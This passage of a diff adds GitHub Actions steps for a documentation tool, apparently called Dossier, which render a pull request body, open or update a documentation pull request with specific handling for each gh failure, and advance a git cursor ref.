+              echo "\`${DOCS_BRANCH}\` moved underneath this run. Nothing was overwritten."
+              echo 'Re-run the workflow; the range is recomputed from the watermark.'
+            } >> "$GITHUB_STEP_SUMMARY"
+            exit 1
+          fi
+
+      - name: Render the pull request body
+        id: body
+        if: steps.commit.outputs.committed == 'true'
+        env:
+          GH_TOKEN: ${{ github.token }}
+          DOSSIER_BASE_SHA: ${{ needs.policy.outputs.base_sha }}
+          DOSSIER_HEAD_SHA: ${{ needs.policy.outputs.head_sha }}
+          DOSSIER_BASE_SOURCE: ${{ needs.policy.outputs.base_source }}
+          DOSSIER_POLICY_REASON: ${{ needs.policy.outputs.reason }}
+          DOSSIER_DOCS_BRANCH: ${{ needs.policy.outputs.docs_branch }}
+          DOSSIER_SIZE_CLASS: ${{ needs.refresh.outputs.size_class }}
+          DOSSIER_FILES_CHANGED: ${{ needs.refresh.outputs.files_changed }}
+          DOSSIER_LINES_CHANGED: ${{ needs.refresh.outputs.lines_changed }}
+          DOSSIER_BASE_REF: ${{ github.event.pull_request.base.ref || github.event.repository.default_branch }}
+          DOSSIER_SOURCE_PR: ${{ github.event.pull_request.number }}
+          DOSSIER_SOURCE_PR_TITLE: ${{ github.event.pull_request.title }}
+          DOSSIER_RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+          EXISTING_PR: ${{ needs.policy.outputs.existing_pr }}
+        run: |
+          set -uo pipefail
+          if [ -n "$EXISTING_PR" ]; then
+            "$DOSSIER_BIN/dossier-pr-body.sh" \
+              --out .dossier/pr-body.md \
+              --existing-pr "$EXISTING_PR" \
+              --evidence .dossier/evidence
+          else
+            "$DOSSIER_BIN/dossier-pr-body.sh" \
+              --out .dossier/pr-body.md \
+              --evidence .dossier/evidence
+          fi
+
+      - name: Open or update the documentation pull request
+        if: steps.commit.outputs.committed == 'true'
+        env:
+          GH_TOKEN: ${{ github.token }}
+          DOCS_BRANCH: ${{ needs.policy.outputs.docs_branch }}
+          EXISTING_PR: ${{ needs.policy.outputs.existing_pr }}
+          BASE_REF: ${{ github.event.pull_request.base.ref || github.event.repository.default_branch }}
+          SIZE_CLASS: ${{ needs.refresh.outputs.size_class }}
+          LABEL_GENERATED: '{{DOSSIER_LABEL_GENERATED}}'
+          LABEL_OVERSIZED: '{{DOSSIER_LABEL_OVERSIZED}}'
+        run: |
+          set -uo pipefail
+
+          if [ -n "$EXISTING_PR" ]; then
+            gh pr edit "$EXISTING_PR" --body-file .dossier/pr-body.md \
+              || echo "::warning title=Dossier::Could not update the body of pull request #${EXISTING_PR}. The commit is pushed regardless."
+            echo "::notice title=Dossier::Updated documentation pull request #${EXISTING_PR}."
+            exit 0
+          fi
+
+          TITLE="docs: refresh the documentation package"
+          set -- --base "$BASE_REF" --head "$DOCS_BRANCH" \
+                 --title "$TITLE" --body-file .dossier/pr-body.md \
+                 --label "$LABEL_GENERATED"
+
+          # An oversized diff is usually the correct output of a cold start or a
+          # large refactor. Discarding it would destroy real work, so the pull
+          # request opens as a draft and says why.
+          if [ "$SIZE_CLASS" = "oversized" ]; then
+            set -- "$@" --draft --label "$LABEL_OVERSIZED"
+          fi
+
+          if PR_URL=$(gh pr create "$@" 2>.dossier/gh-error.txt); then
+            echo "::notice title=Dossier::Opened documentation pull request ${PR_URL}."
+            exit 0
+          fi
+
+          ERR=$(cat .dossier/gh-error.txt 2>/dev/null)
+          echo "$ERR" >&2
+
+          # The push already succeeded, so every branch below has already saved
+          # the work. What is missing is only the pull request, and each failure
+          # has a specific fix.
+          case "$ERR" in
+            *"already exists"*)
+              echo "::notice title=Dossier::A pull request for ${DOCS_BRANCH} already exists — another run created it. Nothing to do."
+              exit 0
+              ;;
+            *"not permitted to create or approve pull requests"*)
+              {
+                echo '### Dossier could not open the pull request'
+                echo
+                echo 'GitHub Actions is not permitted to create pull requests on this repository.'
+                echo 'The documentation commit **is pushed** to `'"${DOCS_BRANCH}"'`; only the pull'
+                echo 'request is missing. Open it by hand, or enable the setting:'
+                echo
+                echo '1. Repository → Settings → Actions → General → Workflow permissions →'
+                echo '   tick **Allow GitHub Actions to create and approve pull requests**.'
+                echo '2. If that checkbox is greyed out, the organisation setting is off. An'
+                echo '   organisation owner has to enable it first, at Organisation → Settings →'
+                echo '   Actions → General. Until they do, the repository-level API call returns'
+                echo '   success and changes nothing, so verify the checkbox afterwards rather'
+                echo '   than trusting the response.'
+              } >> "$GITHUB_STEP_SUMMARY"
+              echo "::error title=Dossier::GitHub Actions is not permitted to create pull requests. The branch is pushed; see the job summary."
+              exit 1
+              ;;
+            *"Resource not accessible by integration"*)
+              {
+                echo '### Dossier could not open the pull request'
+                echo
+                echo 'The token lacks `pull-requests: write`. The branch is pushed. If you have'
+                echo 'edited this workflow, restore the `permissions:` block on the `publish` job.'
+              } >> "$GITHUB_STEP_SUMMARY"
+              echo "::error title=Dossier::The token cannot create pull requests. The branch is pushed; see the job summary."
+              exit 1
+              ;;
+            *"not found"*|*"Label"*)
+              # A missing label must not cost the pull request. Retry without it
+              # and say which label to create.
+              if PR_URL=$(gh pr create --base "$BASE_REF" --head "$DOCS_BRANCH" \
+                            --title "$TITLE" --body-file .dossier/pr-body.md 2>/dev/null); then
+                echo "::warning title=Dossier::Opened ${PR_URL} without labels. Create them with: gh label create '${LABEL_GENERATED}' && gh label create '${LABEL_OVERSIZED}'"
+                exit 0
+              fi
+              echo "::error title=Dossier::Could not open the pull request even without labels. The branch is pushed."
+              exit 1
+              ;;
+            *"No commits between"*)
+              echo "::notice title=Dossier::No commits between ${BASE_REF} and ${DOCS_BRANCH}. Nothing to open."
+              exit 0
+              ;;
+            *)
+              {
+                echo '### Dossier could not open the pull request'
+                echo
+                echo 'The documentation commit **is pushed** to `'"${DOCS_BRANCH}"'`; no work was lost.'
+                echo 'Open the pull request by hand:'
+                echo
+                echo '```sh'
+                echo "gh pr create --base ${BASE_REF} --head ${DOCS_BRANCH} --fill"
+                echo '```'
+              } >> "$GITHUB_STEP_SUMMARY"
+              echo "::error title=Dossier::gh pr create failed. The branch is pushed; see the job summary."
+              exit 1
+              ;;
+          esac
+
+      # Last, and unconditional on whether anything was published: the cursor
+      # advances on every successful run including a no-op, so a range that
+      # produced no documentation change is not re-examined forever.
+      - name: Advance the documentation cursor
+        if: always() && needs.policy.outputs.should_run == 'true'
+        env:
+          HEAD_SHA: ${{ needs.policy.outputs.head_sha }}
+        run: |
+          set -uo pipefail
+          [ -n "${HEAD_SHA:-}" ] || exit 0
+          if git push origin "${HEAD_SHA}:refs/dossier/cursor" 2>/dev/null; then
+            echo "Cursor advanced to ${HEAD_SHA}."
+          else
+            # Not fatal. The state file inside the documentation package is the
+            # durable watermark; the cursor is the fine-grained one, and a
+            # missing advance only widens the next range.
+            echo "::warning title=Dossier::Could not advance refs/dossier/cursor. The next run will document a wider range, which is safe."
+          fi
